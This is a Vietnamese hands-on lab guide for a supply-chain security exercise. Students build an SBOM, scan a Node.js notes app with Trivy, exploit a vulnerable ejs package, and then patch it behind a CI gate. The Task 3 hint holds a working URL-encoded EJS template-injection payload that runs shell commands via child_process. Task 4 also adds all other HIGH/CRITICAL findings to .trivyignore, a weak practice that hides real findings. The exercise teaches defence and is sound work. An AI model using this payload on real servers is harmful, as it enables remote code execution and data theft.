# HƯỚNG DẪN THỰC HÀNH — Lab 4: Chiếm chỗ đứng qua phụ thuộc (Supply Chain / SCA)

- **Mã lab:** `dso-supplychain-sca`
- **Mức độ:** 2/4 (Trung bình)
- **Công cụ:** `syft` (sinh SBOM), `trivy` (SCA offline), `npm`, `curl`, `jq`, `grep`
- **Kiến thức cần:** dòng lệnh Linux; khái niệm thư viện phụ thuộc (dependency) & lockfile; HTTP request/response; SBOM, CVE/CVSS

> Guide này mức **2/4**: mỗi nhiệm vụ cho **mục tiêu + gợi ý tư duy + khung lệnh có chỗ trống `<...>`**. Bạn tự điền chỗ trống. Phần khai thác khó (payload) được giấu trong **Gợi ý mở rộng** ở cuối nhiệm vụ — chỉ mở khi bí. Flag sinh riêng theo mã sinh viên, không có sẵn ở đây.

## Bối cảnh
Tiếp nối chiến dịch: từ mã nguồn CloudNova lấy được ở Lab 3, bạn (kỹ sư DevSecOps) phân tích **chuỗi cung ứng** của ứng dụng ghi chú `vuln-notes` (Node.js). App được dựng vội, khai báo vài thư viện **cũ, chưa vá**. Nhiệm vụ: lập danh mục thành phần (SBOM), quét SCA tìm CVE, **chứng minh** một phụ thuộc có thể bị khai thác từ xa (lấy flag), rồi vá và dựng cổng quét chặn build.

```
            mạng ảo Labtainer (172.37.0.0/24)

 +-------------------------------+        +-------------------------------+
 | dev        172.37.0.10        |  HTTP  | appserver   172.37.0.20       |
 | - mã nguồn ~/vuln-notes       | =====> | - vuln-notes ĐANG CHẠY        |
 | - syft, trivy (DB offline),   | :3000  | - Node.js, cổng 3000          |
 |   npm, jq, curl               |  curl  | - dùng ĐÚNG phiên bản dính CVE |
 | (nơi bạn gõ lệnh)             |        | - /flag.txt trên máy          |
 +-------------------------------+        +-------------------------------+

 Luồng: dev phân tích tĩnh (SBOM+SCA) -> xác định CVE -> curl khai thác
        appserver -> lấy flag -> quay lại dev để vá + dựng security gate
```

Hostname `appserver` và `dev` đã phân giải sẵn (không cần nhớ IP).

## Khởi động
```bash
imodule https://github.com/namlt04/do-an-2026/raw/refs/heads/master/imodule/dso-supplychain-sca.tar
labtainer dso-supplychain-sca
```
Nhập email/mã sinh viên khi được hỏi (flag sinh riêng theo mã của bạn).

---

## Nhiệm vụ 1 — `generate_sbom`: Sinh SBOM & lập danh mục thành phần
**Mục tiêu:** Tạo bức tranh đầy đủ mọi thư viện (kể cả phụ thuộc gián tiếp) của `vuln-notes`.

**Gợi ý tư duy:**
- `package.json` chỉ khai báo phụ thuộc **trực tiếp**; lockfile (`package-lock.json`) mới ghim cả cây phụ thuộc gián tiếp.
- Syft đọc thư mục mã nguồn và xuất SBOM chuẩn **CycloneDX** (JSON). Mỗi thành phần có một `purl` (package URL).
- Đếm số thành phần trong SBOM rồi so với số dep trực tiếp — chênh lệch chính là phụ thuộc gián tiếp.

**Khung lệnh (tự điền):**
```bash
cd ~/vuln-notes
cat package.json
syft dir:. -o cyclonedx-json=<TÊN_FILE_SBOM>
jq '.components | length' <TÊN_FILE_SBOM>
jq -r '.components[] | "\(.name)@\(.version)"' <TÊN_FILE_SBOM> | sort | head -n 40
```
**Hoàn thành khi:** sinh được file SBOM CycloneDX hợp lệ và liệt kê được danh sách thành phần kèm phiên bản (số thành phần > số dep trực tiếp).

**Câu hỏi:** Vì sao số thành phần trong SBOM nhiều hơn số dep khai báo trong `package.json`? Rủi ro gì nếu chỉ rà soát thư viện "mình chủ động cài"? → ____

---

## Nhiệm vụ 2 — `scan_dependencies`: Quét SCA & xác định CVE nguy hiểm
**Mục tiêu:** Dùng Trivy (offline) phát hiện phụ thuộc chứa lỗ hổng, lọc HIGH/CRITICAL và chỉ đích danh **package + phiên bản + CVE** có khả năng khai thác từ xa cao nhất.

**Gợi ý tư duy:**
- Trivy quét filesystem (`trivy fs`) với DB nạp sẵn → phải chạy hoàn toàn **offline** (`--offline-scan --skip-db-update`), chỉ bật scanner `vuln`.
- Xuất JSON rồi dùng `jq` lọc 4 trường cần: `Severity`, `PkgName@InstalledVersion`, `VulnerabilityID`, `FixedVersion`.
- Chọn một CVE cho phép **thực thi mã/lệnh từ xa** (RCE / template injection / deserialization) làm mục tiêu Nhiệm vụ 3. Ghi lại chính xác tên package + phiên bản + mã CVE.

**Khung lệnh:**
```bash
cd ~/vuln-notes
trivy fs --scanners vuln --offline-scan --skip-db-update \
  --severity HIGH,CRITICAL -f json -o <FILE_BÁO_CÁO> .
jq -r '.Results[].Vulnerabilities[]? |
  "\(.Severity)\t\(.PkgName)@\(.InstalledVersion)\t\(.VulnerabilityID)\tfixed:\(.FixedVersion)"' \
  <FILE_BÁO_CÁO> | sort -u
# Đối chiếu bằng công cụ thứ hai:
npm audit || true
```
**Hoàn thành khi:** báo cáo chứa ≥1 lỗ hổng HIGH/CRITICAL và bạn xác định đúng package + phiên bản + CVE dẫn tới RCE.

**Câu hỏi:** Có nhiều CVE trong báo cáo — bạn dựa vào tiêu chí nào (severity/CVSS, có PoC công khai, phụ thuộc có nằm trên đường đi của request người dùng không) để ưu tiên xử lý một CVE trước? → ____

<details><summary>Gợi ý mở rộng</summary>

- CVE mục tiêu của bài là **`CVE-2022-29078`** trên gói **`ejs`** (template engine). Đây là lỗ hổng **SSTI → RCE**: tham số `settings[view options][outputFunctionName]` của EJS cho phép chèn mã JavaScript chạy khi render view.
- Lọc nhanh để xác nhận có mặt: `grep -o 'CVE-2022-29078' <FILE_BÁO_CÁO>`.
- Ghi lại `FixedVersion` của `ejs` để dùng ở Nhiệm vụ 4.
</details>

---

## Nhiệm vụ 3 — `exploit_dependency`: Khai thác phụ thuộc & lấy flag
**Mục tiêu:** Dùng CVE đã xác định để khai thác `appserver` đang chạy, thực thi lệnh trên máy chủ và đọc flag — chứng minh hậu quả thật.

**Gợi ý tư duy:**
- Khảo sát app trước: trang gốc, các endpoint. Endpoint render view bằng EJS là bề mặt SSTI.
- Lỗ hổng EJS cho phép **thực thi lệnh hệ thống** qua `child_process`. Ý tưởng: ép server **copy** file flag (`/flag.txt`) ra một nơi **web đọc được** (thư mục `public/`), rồi tải chuỗi flag về `dev` bằng `curl`.
- Toàn bộ payload phải **URL-encode** khi nhét vào query string.
- **Quan trọng để chấm điểm:** lưu chuỗi flag vào `~/flag_loot.txt` trên máy `dev` (checkwork đọc file này).

**Khung lệnh:**
```bash
curl -s http://appserver:3000/ | head
# Gửi request SSTI (payload EJS đã URL-encode) để copy /flag.txt -> public/leak.txt:
curl -s "http://appserver:3000/<ENDPOINT_RENDER>?name=x&<PAYLOAD_EJS_URL_ENCODE>" >/dev/null
sleep 2
# Tải flag đã lộ ra public rồi lưu lại:
curl -s "http://appserver:3000/leak.txt" | tr -d '\r\n' > ~/flag_loot.txt
cat ~/flag_loot.txt
```
**Hoàn thành khi:** `~/flag_loot.txt` chứa chuỗi flag đúng định dạng của bài.

**Câu hỏi:** Vì sao một lỗ hổng chỉ nằm trong **thư viện phụ thuộc** (không phải mã đội tự viết) vẫn dẫn tới chiếm quyền thực thi? Liên hệ MITRE **T1195 Supply Chain Compromise**. → ____

<details><summary>Gợi ý mở rộng</summary>

- Endpoint render của `vuln-notes` là `/notes` (nhận tham số `name`).
- Payload EJS SSTI (đặt sau `name=x&`), đã URL-encode, đẩy lệnh copy flag ra public:
  ```
  settings%5Bview%20options%5D%5BoutputFunctionName%5D=x%3Bprocess.mainModule.require(%27child_process%27).execSync(%27cp%20%2Fflag.txt%20%2Fhome%2Fubuntu%2Fapp%2Fpublic%2Fleak.txt%27)%3Bs
  ```
  (giải mã: `x;process.mainModule.require('child_process').execSync('cp /flag.txt /home/ubuntu/app/public/leak.txt');s`)
- Sau khi gửi, flag nằm tại `http://appserver:3000/leak.txt`.
</details>

---

## Nhiệm vụ 4 — `remediate_and_gate`: Vá phụ thuộc & dựng cổng quét CI
**Mục tiêu:** Đổi vai phòng thủ — nâng `ejs` lên phiên bản đã vá, quét lại chứng minh sạch, và viết một **security gate** (Trivy `--exit-code 1`) để CI chặn build khi còn lỗ hổng.

**Gợi ý tư duy:**
- Nâng cấp package dính CVE lên `FixedVersion` (Nhiệm vụ 2) bằng `npm install`, cài **offline** (`--prefer-offline`).
- Quét lại: CVE mục tiêu phải **biến mất**. Các CVE còn lại đến từ phụ thuộc gián tiếp khác (không phải mục tiêu) — có thể đưa vào `.trivyignore` **có kiểm soát** để gate không báo động giả.
- Security gate = Trivy với `--exit-code 1 --severity HIGH,CRITICAL`: còn lỗ hổng → thoát khác 0 (CI fail); đã vá → thoát 0.
- **Quan trọng:** script gate phải chạy thành công (in dòng "SCA gate PASSED") để checkwork ghi nhận.

**Khung lệnh:**
```bash
cd ~/vuln-notes
npm install ejs@<PHIÊN_BẢN_ĐÃ_VÁ> --prefer-offline --no-audit --no-fund
# (tùy chọn) đưa các CVE gián tiếp còn lại — KHÔNG phải CVE mục tiêu — vào danh sách duyệt:
trivy fs --scanners vuln --offline-scan --skip-db-update --severity HIGH,CRITICAL -f json -o after.json .
grep -oE 'CVE-[0-9]{4}-[0-9]+' after.json | grep -v 'CVE-2022-29078' | sort -u > .trivyignore
# Dựng security gate:
cat > scan-gate.sh <<'EOS'
#!/bin/bash
set -e
echo "[CI] Running SCA security gate..."
trivy fs --scanners vuln --offline-scan --skip-db-update \
  --severity HIGH,CRITICAL --exit-code 1 --ignorefile .trivyignore .
echo "SCA gate PASSED: khong con lo hong HIGH/CRITICAL (ngoai danh sach da duyet)."
EOS
chmod +x scan-gate.sh
./scan-gate.sh
echo "Ma thoat gate: $?"
```
**Hoàn thành khi:** `ejs` đã lên phiên bản vá (thể hiện trong lockfile), CVE mục tiêu không còn, và `scan-gate.sh` thoát 0 (in "SCA gate PASSED").

**Câu hỏi:** Đặt security gate SCA ngay trong CI lợi gì so với rà soát thủ công sau khi lên production (chi phí sửa, thời gian phát hiện, tính lặp lại)? Nêu một hạn chế (false positive) và cách giảm thiểu (`.trivyignore` có kiểm soát). → ____

---

## Chấm điểm
```bash
checkwork dso-supplychain-sca
```
Đạt khi cả 4 mục tiêu = **Y**: `generate_sbom`, `scan_dependencies`, `exploit_dependency`, `remediate_and_gate`.

> Nếu một mục chưa Y: đọc lại **gợi ý tư duy** của nhiệm vụ tương ứng và kiểm tra file bằng chứng (`sbom.cdx.json`, `trivy-report.json`, `~/flag_loot.txt`, `scan-gate.sh`). Phần khó (payload EJS, phiên bản vá) nằm trong **Gợi ý mở rộng**.
